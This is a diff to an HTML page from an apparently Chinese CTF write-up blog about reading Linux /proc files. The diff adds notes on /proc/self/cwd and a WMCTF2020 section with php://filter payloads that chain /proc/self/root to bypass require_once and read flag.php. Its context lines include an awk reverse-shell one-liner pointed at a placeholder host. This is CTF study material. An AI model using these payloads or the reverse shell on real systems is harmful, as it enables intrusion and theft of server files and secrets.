@@ -79,7 +79,7 @@ linux信息文件读取
 <p><img src="image-20201216154655759.png" alt="image-20201216154655759"></p>
 <p>之后你可以直接读取到flag了[</p>
 <p>我感觉有点奇怪，这道题应该没那么简单，看了别人的WP才知道应该读取linuxproc下的文件，这里整理一下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/proc/[pid]/cmdline  #查看当前linux正在执行什么命令，在这里pid不知道的情况下我们可以通过self代指当前web端的文件</span><br><span class="line"></span><br><span class="line">/proc/self/comm #查看当前进程的命令名</span><br><span class="line"></span><br><span class="line">/proc/self/cwd #查看当前工作目录的符号连接</span><br><span class="line"></span><br><span class="line">/proc/self/environ #显示进程的环境变量</span><br><span class="line"></span><br><span class="line">/proc/self/exe #查看实际运行程序的符号链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/proc/self/fd #一个目录，包含进程打开文件的情况（注意这里曾经出过考点，如果看到一个程序Python打开某个txt之后没有关闭，就可以利用这里来读取 </span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/proc/[pid]/cmdline  #查看当前linux正在执行什么命令，在这里pid不知道的情况下我们可以通过self代指当前web端的文件</span><br><span class="line"></span><br><span class="line">/proc/self/comm #查看当前进程的命令名</span><br><span class="line"></span><br><span class="line">/proc/self/cwd #查看当前工作目录的符号连接</span><br><span class="line">cwd下面会有可以读取的文件，比如</span><br><span class="line">/var/www/html 下我在工作，那么/proc/self/cwd/index.php 同样可以读取到</span><br><span class="line"></span><br><span class="line">/proc/self/environ #显示进程的环境变量</span><br><span class="line"></span><br><span class="line">/proc/self/exe #查看实际运行程序的符号链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/proc/self/fd #一个目录，包含进程打开文件的情况（注意这里曾经出过考点，如果看到一个程序Python打开某个txt之后没有关闭，就可以利用这里来读取 </span><br></pre></td></tr></table></figure>
 
 
 
@@ -125,6 +125,24 @@ linux信息文件读取
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
 
+
+<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><p>绕过require_once 只能包含一次的的限制</p>
+<p>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</p>
+<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br><span class="line">&#x2F;&#x2F;result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo&#x3D;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>接下来我们将对绕过的原理进行分析，php7.2.23的源码进行分析，建议配合Clion在linux里进行调试，至于如何搭建调试环境，可以自行搜索，参考一些别的文章。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5ODA0NDE2MA&#x3D;&#x3D;&amp;mid&#x3D;2649729209&amp;idx&#x3D;1&amp;sn&#x3D;78c1f6cf291e5cfca3088f02216ccffd&amp;chksm&#x3D;888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime&#x3D;1597388716474&amp;sharer_shareid&#x3D;33a823b10ae99f33a60db621d83241cb#rd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另外一种方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;571be1a2-1a80-477d-8f8c-71cd3a4d93a3.node3.buuoj.cn&#x2F;</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;123&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src="">
@@ -159,7 +177,7 @@ linux信息文件读取
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">做题思路</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">做题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WMCTF2020-Make-PHP-Great-Again"><span class="toc-number">2.1.</span> <span class="toc-text">[WMCTF2020]Make PHP Great Again</span></a></li></ol></li></ol>	
         </div>
     
 </div>
